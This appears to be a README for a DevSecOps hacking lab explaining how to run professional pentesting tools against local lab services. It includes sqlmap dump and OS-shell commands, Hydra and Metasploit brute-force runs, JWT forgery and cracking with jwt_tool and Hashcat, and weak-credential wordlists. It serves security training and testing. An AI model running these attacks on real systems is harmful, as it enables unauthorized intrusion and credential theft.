# Professional Pentesting Tools Integration

## Overview

Integration of industry-standard security testing tools with DevSecOps Hacking Lab. Instead of writing custom attack scripts, this demonstrates how to use professional tools that security researchers and red teams use in real engagements.

## Quick Start

### Option 1: Docker Compose (Recommended)

Run all tools in isolated containers:

```bash
cd attacks/professional-tools

# Start all security tools
docker-compose -f docker-compose-tools.yml up -d

# Run specific tool
docker-compose -f docker-compose-tools.yml run nuclei
docker-compose -f docker-compose-tools.yml run sqlmap
docker-compose -f docker-compose-tools.yml run trivy

# Stop all tools
docker-compose -f docker-compose-tools.yml down
```

### Option 2: Automated Scan Script

Run comprehensive security scan with all tools:

```bash
cd attacks/professional-tools
chmod +x run-professional-scans.sh
./run-professional-scans.sh
```

Results will be saved to `results/<timestamp>/` with HTML summary report.

### Option 3: Manual Tool Usage

See individual tool guides below.

## Tools Included

### 1. Burp Suite Professional

**Purpose**: Comprehensive web application security testing

**Setup**: [burp-suite-setup.md](burp-suite-setup.md)

**Quick Start**:
```bash
# Start Burp proxy on 8081 (not 8080, that's our gateway)
# Configure browser: 127.0.0.1:8081
# Import CA certificate from http://burp
```

**Key Features**:
- Proxy: Intercept and modify HTTP/S requests
- Scanner: Automated vulnerability detection
- Intruder: Credential brute force, fuzzing
- Repeater: Manual request manipulation
- JWT Editor extension: Token manipulation

**Lab Scenarios**:
- JWT algorithm confusion testing
- IDOR enumeration via Intruder
- SQL injection scanning
- Rate limit bypass testing

### 2. OWASP ZAP

**Purpose**: Free automated web app scanner

**Docker**:
```bash
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable \
  zap.sh -daemon -host 0.0.0.0 -port 8090
```

**Usage**:
```bash
# Spider application
curl "http://localhost:8090/JSON/spider/action/scan/?url=http://host.docker.internal:8080"

# Active scan
curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://host.docker.internal:8080"

# Get alerts
curl "http://localhost:8090/JSON/core/view/alerts/" | jq

# HTML report
curl "http://localhost:8090/OTHER/core/other/htmlreport/" > zap_report.html
```

### 3. SQLMap

**Purpose**: Automated SQL injection exploitation

**Usage**:
```bash
# Basic test
sqlmap -u "http://localhost:8002/users?id=1" --batch

# Enumerate databases
sqlmap -u "http://localhost:8002/users?id=1" --dbs --batch

# Dump table
sqlmap -u "http://localhost:8002/users?id=1" -D userdb -T users --dump --batch

# OS shell (if vulnerable)
sqlmap -u "http://localhost:8002/users?id=1" --os-shell --batch
```

**Docker**:
```bash
docker run --rm -it --network devsecops_default paoloo/sqlmap \
  -u "http://user-service:8000/users?id=1" --batch --dbs
```

### 4. Nuclei

**Purpose**: Template-based vulnerability scanner

**Installation**:
```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

**Usage**:
```bash
# Update templates
nuclei -update-templates

# Scan with custom templates
nuclei -u http://localhost:8080 -t nuclei-templates.yaml -json -o results.json

# Scan for CVEs
nuclei -u http://localhost:8080 -t cves/ -severity critical,high

# Scan for misconfigurations
nuclei -u http://localhost:8080 -t misconfiguration/
```

**Custom Templates**: See [nuclei-templates.yaml](nuclei-templates.yaml)

### 5. Hydra

**Purpose**: Network authentication brute forcer

**Usage**:
```bash
# HTTP POST brute force
hydra -L users.txt -P passwords.txt \
  localhost -s 8000 \
  http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid" \
  -t 4 -V

# With JSON payload (requires custom script)
# See: credential-stuffing attack for JSON API support
```

### 6. jwt_tool

**Purpose**: JWT manipulation and exploitation

**Installation**:
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
```

**Usage**:
```bash
# Decode token
python3 jwt_tool.py <TOKEN>

# Test all exploits
python3 jwt_tool.py <TOKEN> -M at -t "http://localhost:8080/api/profile"

# Algorithm confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem

# None algorithm
python3 jwt_tool.py <TOKEN> -X n

# Brute force secret
python3 jwt_tool.py <TOKEN> -C -d rockyou.txt
```

**Docker**:
```bash
docker build -t jwt_tool -f Dockerfile.jwt_tool .
docker run --rm -it jwt_tool <TOKEN>
```

### 7. Nmap

**Purpose**: Network discovery and service enumeration

**Usage**:
```bash
# Basic service scan
nmap -sV -p 8000,8002,8080,9090,3000,9093,5002,6379 localhost

# Aggressive scan
nmap -A -sV -sC -p- localhost

# Vulnerability scripts
nmap --script vuln -p 8000,8002,8080 localhost

# Output formats
nmap -sV -oA scan_results localhost  # All formats
nmap -sV -oX scan.xml localhost      # XML (for Metasploit)
```

### 8. ffuf

**Purpose**: Fast web fuzzer

**Installation**:
```bash
go install github.com/ffuf/ffuf@latest
```

**Usage**:
```bash
# Fuzz API endpoints
ffuf -w api-endpoints.txt \
  -u http://localhost:8080/api/FUZZ \
  -mc 200,201,204,301,302,401,403 \
  -o results.json

# Fuzz parameters
ffuf -w params.txt \
  -u http://localhost:8080/api/profile?FUZZ=1 \
  -mc 200 -c -v

# Fuzz headers
ffuf -w headers.txt \
  -u http://localhost:8080/api/profile \
  -H "FUZZ: test" \
  -mc 200 -c -v
```

### 9. Metasploit

**Purpose**: Exploitation framework

**Docker**:
```bash
docker run --rm -it -v $(pwd)/msf-data:/root/.msf4 \
  metasploitframework/metasploit-framework msfconsole
```

**Usage**:
```
# Search modules
search jwt
search api
search docker

# Example: JWT scanner
use auxiliary/scanner/http/jwt_secret_scanner
set RHOSTS localhost
set RPORT 8080
run

# Example: Brute force
use auxiliary/scanner/http/http_login
set RHOSTS localhost
set RPORT 8000
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### 10. Hashcat

**Purpose**: GPU password cracking

**Usage**:
```bash
# JWT secret cracking (mode 16500)
hashcat -m 16500 jwt.txt rockyou.txt

# Brute force (8 chars, lowercase + digits)
hashcat -m 16500 jwt.txt -a 3 ?l?l?l?l?l?l?l?l

# Show cracked
hashcat -m 16500 jwt.txt --show
```

### 11. Trivy

**Purpose**: Container vulnerability scanner

**Installation**:
```bash
brew install aquasecurity/trivy/trivy
```

**Usage**:
```bash
# Scan Docker images
trivy image login-api:latest
trivy image --severity HIGH,CRITICAL api-gateway:latest

# Scan filesystem (IaC)
trivy fs --security-checks vuln,config .

# Output to JSON
trivy image -f json -o trivy.json login-api:latest
```

### 12. GitLeaks

**Purpose**: Secret scanning in git repos

**Installation**:
```bash
brew install gitleaks
```

**Usage**:
```bash
# Scan repository
gitleaks detect --source . --verbose

# With report
gitleaks detect --source . --report-path gitleaks.json

# Pre-commit hook
gitleaks protect --staged --verbose
```

## Complete Attack Scenarios

### Scenario 1: Full Penetration Test

```bash
# 1. Network reconnaissance
nmap -sV -p- localhost -oN nmap.txt

# 2. Service enumeration
nuclei -u http://localhost:8080 -t nuclei-templates.yaml

# 3. API fuzzing
ffuf -w api-endpoints.txt -u http://localhost:8080/api/FUZZ

# 4. SQL injection
sqlmap -u "http://localhost:8002/users?id=1" --batch --dbs

# 5. JWT exploitation
python3 jwt_tool.py <TOKEN> -M at

# 6. Credential stuffing
# Use: attacks/credential-stuffing/intelligent_credential_stuffing.py

# 7. Container scanning
trivy image login-api:latest --severity HIGH,CRITICAL

# 8. Secret detection
gitleaks detect --source ../..
```

### Scenario 2: JWT Exploitation Chain

```bash
# Get token
TOKEN=$(curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.challenge_id')

# Analyze
python3 jwt_tool.py $TOKEN

# Algorithm confusion
python3 jwt_tool.py $TOKEN -X k

# None algorithm
python3 jwt_tool.py $TOKEN -X n

# Brute force secret
python3 jwt_tool.py $TOKEN -C -d rockyou.txt

# Claims tampering
python3 jwt_tool.py $TOKEN -I -pc role -pv admin
```

### Scenario 3: Container Security Audit

```bash
# Image scanning
trivy image login-api:latest
trivy image api-gateway:latest
trivy image user-service:latest

# IaC scanning
trivy fs --security-checks vuln,config infrastructure/

# Secret detection
gitleaks detect --source .

# Network segmentation
nmap -sV 172.17.0.0/24

# Docker bench security
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo sh docker-bench-security.sh
```

## Wordlists

### API Endpoints
```
profile
users
admin
settings
config
api
v1
v2
health
metrics
status
```

### Common Passwords
```
admin123
password123
Welcome@2024
qwerty123
letmein
admin
password
```

### Common Usernames
```
admin
user
alice
bob
charlie
demo
test
```

## Integration with CI/CD

### GitHub Actions Example

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Secret scanning
      - name: GitLeaks
        uses: gitleaks/gitleaks-action@v2

      # Container scanning
      - name: Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'login-api:latest'
          severity: 'CRITICAL,HIGH'

      # Nuclei scan
      - name: Nuclei
        uses: projectdiscovery/nuclei-action@main
        with:
          target: http://localhost:8080
          templates: nuclei-templates.yaml
```

## Tool Comparison

| Tool | Type | Cost | Speed | Accuracy | Best For |
|------|------|------|-------|----------|----------|
| Burp Suite Pro | Manual | $$$$ | Slow | High | Comprehensive testing |
| OWASP ZAP | Auto | Free | Medium | Medium | Automated scanning |
| SQLMap | Specialized | Free | Fast | High | SQL injection |
| Nuclei | Auto | Free | Fast | High | Template-based scans |
| Hydra | Brute force | Free | Fast | N/A | Credential testing |
| jwt_tool | Specialized | Free | Fast | High | JWT exploitation |
| Metasploit | Framework | Free | Medium | High | Full engagement |

## Resources

### Official Documentation
- [Burp Suite](https://portswigger.net/burp/documentation)
- [OWASP ZAP](https://www.zaproxy.org/docs/)
- [Nuclei](https://nuclei.projectdiscovery.io/)
- [Metasploit](https://docs.metasploit.com/)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)

### Training
- [PortSwigger Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
